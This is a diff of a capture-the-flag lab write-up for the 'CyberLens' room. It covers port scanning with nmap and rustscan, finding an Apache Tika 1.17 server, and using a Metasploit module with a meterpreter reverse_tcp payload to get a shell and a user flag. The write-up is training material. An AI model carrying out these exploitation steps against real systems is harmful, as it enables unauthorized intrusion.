@@ -11,10 +11,10 @@ IP 10.10.234.94
 added cyberlens.thm to hosts file (mentioned in the room description)
 ![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/dc1950a7-8a20-4dab-9752-f0bb18e66d02)
 
-Fast NMAP scan of target. `nmap -F cyberlens.thm`
+Fast NMAP scan of target. `nmap -F cyberlens.thm`\
 Found ports 80,135,139,445,3389
 
-rustscan of target. `rustscan -a 10.10.234.94
+rustscan of target. `rustscan -a 10.10.234.94\
 Found ports 80,135,139,3389,445,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,61777
 
 Running nmap service scan of all open ports `nmap -sV -p80,135,139,3389,445,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,61777 cyberlens.thm`
@@ -41,4 +41,39 @@ PORT      STATE SERVICE       VERSION
 Found HTTP servers on ports 80,5985,47001,61777
 
 Opened firefox browser and burpsuite, proxying traffic
+
+Navigated to http://cyberlens.thm
+
+Identified file upload location
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/7563d775-8fcf-4127-8504-b32fd9ccb44c)
+
+clicked "browse" and selected a benign JPG. Clicked "GET Metadata"
+
+Proxy shows a request made to `cyberlens.thm:61777/meta`
+
+Navigated to https://cyberlens.thm:61777. It is running `Apache Tika 1.17 Server`
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/9f653a6f-1c26-4b83-bae5-008279feb550)
+
+Searched exploit-db for "Apache Tika 1.17, and found a metasploit exploit that seems compatible. (https://www.exploit-db.com/exploits/47208)
+
+started msfconsole and searched for apache tika, and found the exploit module.
+
+used module, and using default payload "windows/meterpreter/reverse_tcp"
+
+set RHOSTS cyberlens.thm\
+set RPORT 61777\
+exploit
+
+Exploit succeeded, established meterpreter shell
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/0013ced4-53ce-40f4-b7a8-db7ea20e3059)
+
+`shell` opened shell. `powershell` opened powershell shell
+
+Navigated to C:/Users. Found 2 users, Administrator and CyberLens
+
+Navigated to C:\Users\CyberLens\Desktop and found a file named "user.txt"
+
+Obtained first flag
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/8c3cebbe-b8a0-4232-8f92-bfc673e59686)
+
 
